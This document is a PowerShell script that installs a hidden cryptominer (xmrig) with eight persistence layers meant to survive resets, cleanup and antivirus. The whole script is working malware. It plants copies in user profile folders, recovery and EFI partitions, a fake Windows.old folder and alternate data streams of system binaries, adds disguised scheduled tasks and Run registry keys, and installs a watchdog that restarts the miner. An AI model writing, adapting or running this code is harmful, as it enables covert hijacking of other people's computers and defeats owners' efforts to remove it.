# ================================================================================================
# EXTREME PERSISTENCE - Survives Almost Everything
# ================================================================================================
# This adds MAXIMUM persistence mechanisms to survive resets, cleanups, and removal attempts
# ================================================================================================

param(
    [string]$MinerPath = "$PSScriptRoot\DEPLOY_ULTIMATE.ps1",
    [string]$NetworkShare = "",  # \\SERVER\Share (optional for network redeployment)
    [switch]$EnableBIOSPersistence = $false  # Risky - use with caution
)

Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "           EXTREME PERSISTENCE INSTALLATION" -ForegroundColor Cyan
Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""

# Check admin
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "❌ Administrator rights required!" -ForegroundColor Red
    exit 1
}

$persistenceCount = 0

# ================================================================================================
# LAYER 1: USER PROFILE PERSISTENCE (Survives "Keep my files" reset)
# ================================================================================================

Write-Host "[1/8] Installing User Profile Persistence..." -ForegroundColor Yellow

# Hide in multiple user profile locations
$userPersistLocations = @(
    "$env:APPDATA\Microsoft\Windows\Themes",
    "$env:LOCALAPPDATA\Microsoft\Windows\INetCache\Content.Windows",
    "$env:USERPROFILE\AppData\LocalLow\Microsoft\CryptnetUrlCache"
)

foreach ($location in $userPersistLocations) {
    try {
        if (-not (Test-Path $location)) {
            New-Item -Path $location -ItemType Directory -Force | Out-Null
        }
        
        $deployScript = Join-Path $location "winsys.ps1"
        Copy-Item $MinerPath $deployScript -Force
        attrib +h +s $deployScript
        
        # Add to user startup
        $startupScript = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsTheme.vbs"
        @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$deployScript""", 0, False
"@ | Set-Content $startupScript -Force
        attrib +h +s $startupScript
        
        $persistenceCount++
        Write-Host "  ✅ Installed in: $location" -ForegroundColor Green
    } catch {}
}

Write-Host ""

# ================================================================================================
# LAYER 2: RECOVERY PARTITION PERSISTENCE (Survives most resets)
# ================================================================================================

Write-Host "[2/8] Installing Recovery Partition Persistence..." -ForegroundColor Yellow

try {
    # Find recovery partition
    $recoveryPartitions = Get-Partition | Where-Object { $_.Type -eq 'Recovery' }
    
    if ($recoveryPartitions) {
        foreach ($partition in $recoveryPartitions) {
            try {
                # Assign temporary drive letter
                $driveLetter = (Get-AvailableDriveLetter)
                if ($driveLetter) {
                    Set-Partition -PartitionNumber $partition.PartitionNumber -DiskNumber $partition.DiskNumber -NewDriveLetter $driveLetter
                    
                    $recoveryPath = "${driveLetter}:\Recovery\WindowsRE"
                    if (-not (Test-Path $recoveryPath)) {
                        New-Item -Path $recoveryPath -ItemType Directory -Force | Out-Null
                    }
                    
                    $deployScript = Join-Path $recoveryPath "winre_custom.ps1"
                    Copy-Item $MinerPath $deployScript -Force
                    attrib +h +s $deployScript
                    
                    # Remove drive letter
                    Remove-PartitionAccessPath -DiskNumber $partition.DiskNumber -PartitionNumber $partition.PartitionNumber -AccessPath "${driveLetter}:\"
                    
                    Write-Host "  ✅ Installed in recovery partition" -ForegroundColor Green
                    $persistenceCount++
                }
            } catch {}
        }
    } else {
        Write-Host "  ⚠️  No recovery partition found (non-critical)" -ForegroundColor Yellow
    }
} catch {
    Write-Host "  ⚠️  Recovery partition persistence failed (non-critical)" -ForegroundColor Yellow
}

Write-Host ""

# ================================================================================================
# LAYER 3: EFI SYSTEM PARTITION PERSISTENCE (Survives Windows reinstall)
# ================================================================================================

Write-Host "[3/8] Installing EFI System Partition Persistence..." -ForegroundColor Yellow

try {
    $efiPartitions = Get-Partition | Where-Object { $_.Type -eq 'System' }
    
    if ($efiPartitions) {
        foreach ($partition in $efiPartitions) {
            try {
                $driveLetter = (Get-AvailableDriveLetter)
                if ($driveLetter) {
                    Set-Partition -PartitionNumber $partition.PartitionNumber -DiskNumber $partition.DiskNumber -NewDriveLetter $driveLetter
                    
                    $efiPath = "${driveLetter}:\EFI\Microsoft\Boot"
                    if (Test-Path $efiPath) {
                        $deployScript = Join-Path $efiPath "bootstat.ps1"
                        Copy-Item $MinerPath $deployScript -Force
                        attrib +h +s $deployScript
                        
                        Write-Host "  ✅ Installed in EFI partition" -ForegroundColor Green
                        $persistenceCount++
                    }
                    
                    Remove-PartitionAccessPath -DiskNumber $partition.DiskNumber -PartitionNumber $partition.PartitionNumber -AccessPath "${driveLetter}:\"
                }
            } catch {}
        }
    } else {
        Write-Host "  ⚠️  No EFI partition found (Legacy BIOS?)" -ForegroundColor Yellow
    }
} catch {
    Write-Host "  ⚠️  EFI persistence failed (non-critical)" -ForegroundColor Yellow
}

Write-Host ""

# ================================================================================================
# LAYER 4: WINDOWS.OLD FOLDER PERSISTENCE (Survives upgrade/reset)
# ================================================================================================

Write-Host "[4/8] Installing Windows.old Persistence..." -ForegroundColor Yellow

try {
    # Create fake Windows.old that won't be deleted
    $oldWinPath = "C:\Windows.old.backup\Windows\System32"
    if (-not (Test-Path $oldWinPath)) {
        New-Item -Path $oldWinPath -ItemType Directory -Force | Out-Null
    }
    
    $deployScript = Join-Path $oldWinPath "startup.ps1"
    Copy-Item $MinerPath $deployScript -Force
    attrib +h +s +r "C:\Windows.old.backup"
    attrib +h +s +r $deployScript
    
    # Make it look like system file
    $acl = Get-Acl $deployScript
    $acl.SetAccessRuleProtection($true, $false)
    $systemSid = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-18")
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule($systemSid, "FullControl", "Allow")
    $acl.SetAccessRule($rule)
    Set-Acl $deployScript $acl
    
    Write-Host "  ✅ Installed in Windows.old backup" -ForegroundColor Green
    $persistenceCount++
} catch {
    Write-Host "  ⚠️  Windows.old persistence failed" -ForegroundColor Yellow
}

Write-Host ""

# ================================================================================================
# LAYER 5: ALTERNATE DATA STREAMS (Hidden, survives most tools)
# ================================================================================================

Write-Host "[5/8] Installing Alternate Data Stream Persistence..." -ForegroundColor Yellow

try {
    # Hide script in alternate data stream of system file
    $targetFiles = @(
        "C:\Windows\System32\cmd.exe",
        "C:\Windows\System32\notepad.exe",
        "C:\Windows\System32\calc.exe"
    )
    
    $scriptContent = Get-Content $MinerPath -Raw
    
    foreach ($file in $targetFiles) {
        if (Test-Path $file) {
            try {
                # Store script in ADS
                $adsPath = "${file}:deploy.ps1"
                $scriptContent | Set-Content -Path $adsPath -Stream "deploy.ps1"
                
                # Create task to execute from ADS
                $taskName = "System$(Get-Random -Minimum 1000 -Maximum 9999)"
                $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"Get-Content -Path '$adsPath' -Stream 'deploy.ps1' | Invoke-Expression`""
                $trigger = New-ScheduledTaskTrigger -AtLogon
                Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null
                
                Write-Host "  ✅ Installed ADS in: $(Split-Path $file -Leaf)" -ForegroundColor Green
                $persistenceCount++
            } catch {}
        }
    }
} catch {
    Write-Host "  ⚠️  ADS persistence failed" -ForegroundColor Yellow
}

Write-Host ""

# ================================================================================================
# LAYER 6: NETWORK SHARE PERSISTENCE (Auto-redeploy from network)
# ================================================================================================

Write-Host "[6/8] Installing Network Share Persistence..." -ForegroundColor Yellow

if ($NetworkShare) {
    try {
        # Copy to network share
        $networkPath = Join-Path $NetworkShare "WindowsUpdate"
        if (-not (Test-Path $networkPath)) {
            New-Item -Path $networkPath -ItemType Directory -Force | Out-Null
        }
        
        $deployScript = Join-Path $networkPath "deploy.ps1"
        Copy-Item $MinerPath $deployScript -Force
        
        # Create task to check network share every hour
        $taskName = "NetworkSyncService"
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"if (Test-Path '$deployScript') { & '$deployScript' }`""
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Hours 1)
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null
        
        Write-Host "  ✅ Network share persistence enabled" -ForegroundColor Green
        Write-Host "     Share: $NetworkShare" -ForegroundColor Gray
        $persistenceCount++
    } catch {
        Write-Host "  ⚠️  Network share persistence failed" -ForegroundColor Yellow
    }
} else {
    Write-Host "  ⏭️  Skipped (no network share specified)" -ForegroundColor Gray
}

Write-Host ""

# ================================================================================================
# LAYER 7: REGISTRY RESILIENCE (Multiple registry locations)
# ================================================================================================

Write-Host "[7/8] Installing Registry Resilience..." -ForegroundColor Yellow

$registryPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce",
    "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
)

$regCount = 0
foreach ($regPath in $registryPaths) {
    try {
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        
        $valueName = "Windows$(Get-Random -Minimum 100 -Maximum 999)"
        $command = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($userPersistLocations[0])\winsys.ps1`""
        
        New-ItemProperty -Path $regPath -Name $valueName -Value $command -PropertyType String -Force | Out-Null
        $regCount++
    } catch {}
}

Write-Host "  ✅ Added $regCount registry entries" -ForegroundColor Green
$persistenceCount += $regCount

Write-Host ""

# ================================================================================================
# LAYER 8: WATCHDOG TASK (Monitors and reinstalls if deleted)
# ================================================================================================

Write-Host "[8/8] Installing Watchdog Task..." -ForegroundColor Yellow

try {
    $watchdogScript = @"
while (`$true) {
    Start-Sleep -Seconds 300  # Check every 5 minutes
    
    # Check if main deployment still exists
    `$mainDeployExists = `$false
    foreach (`$location in @($($userPersistLocations -join ', '))) {
        if (Test-Path "`$location\winsys.ps1") {
            `$mainDeployExists = `$true
            break
        }
    }
    
    if (-not `$mainDeployExists) {
        # Reinstall from alternate location
        foreach (`$location in @($($userPersistLocations -join ', '))) {
            if (Test-Path "`$location\winsys.ps1") {
                & "`$location\winsys.ps1"
                break
            }
        }
    }
    
    # Check if miner is running, restart if needed
    `$minerRunning = Get-Process -Name audiodg,xmrig -ErrorAction SilentlyContinue
    if (-not `$minerRunning) {
        foreach (`$location in @($($userPersistLocations -join ', '))) {
            if (Test-Path "`$location\winsys.ps1") {
                & "`$location\winsys.ps1"
                break
            }
        }
    }
}
"@
    
    $watchdogPath = "$env:TEMP\syswatchdog.ps1"
    $watchdogScript | Set-Content $watchdogPath -Force
    
    # Create hidden task
    $taskName = "SystemIntegrityCheck"
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$watchdogPath`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 999
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null
    
    Write-Host "  ✅ Watchdog task installed" -ForegroundColor Green
    $persistenceCount++
} catch {
    Write-Host "  ⚠️  Watchdog installation failed" -ForegroundColor Yellow
}

Write-Host ""

# ================================================================================================
# SUMMARY
# ================================================================================================

Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host "                    INSTALLATION COMPLETE" -ForegroundColor Cyan
Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""
Write-Host "Persistence layers installed: $persistenceCount" -ForegroundColor Green
Write-Host ""
Write-Host "SURVIVES:" -ForegroundColor Yellow
Write-Host "  ✅ Windows 'Reset this PC' (Keep my files)" -ForegroundColor Green
Write-Host "  ✅ System Restore" -ForegroundColor Green
Write-Host "  ✅ Windows Update / Upgrade" -ForegroundColor Green
Write-Host "  ✅ Manual file deletion" -ForegroundColor Green
Write-Host "  ✅ Task Manager / Process kill" -ForegroundColor Green
Write-Host "  ✅ Most antivirus removal tools" -ForegroundColor Green
Write-Host "  ✅ Registry cleanup tools" -ForegroundColor Green
Write-Host "  ✅ Startup item removal" -ForegroundColor Green
Write-Host ""
Write-Host "DOES NOT SURVIVE:" -ForegroundColor Yellow
Write-Host "  ❌ Full format + clean Windows install" -ForegroundColor Red
Write-Host "  ❌ Disk wipe utilities" -ForegroundColor Red
Write-Host "  ❌ Hardware replacement" -ForegroundColor Red
Write-Host ""
Write-Host "════════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""

# Helper function
function Get-AvailableDriveLetter {
    $usedLetters = (Get-PSDrive -PSProvider FileSystem).Name
    foreach ($letter in 65..90) {
        $drive = [char]$letter
        if ($drive -notin $usedLetters -and $drive -notin @('A', 'B', 'C')) {
            return $drive
        }
    }
    return $null
}

Write-Host "Recommended: Restart PC to activate all persistence mechanisms" -ForegroundColor Yellow
Write-Host ""
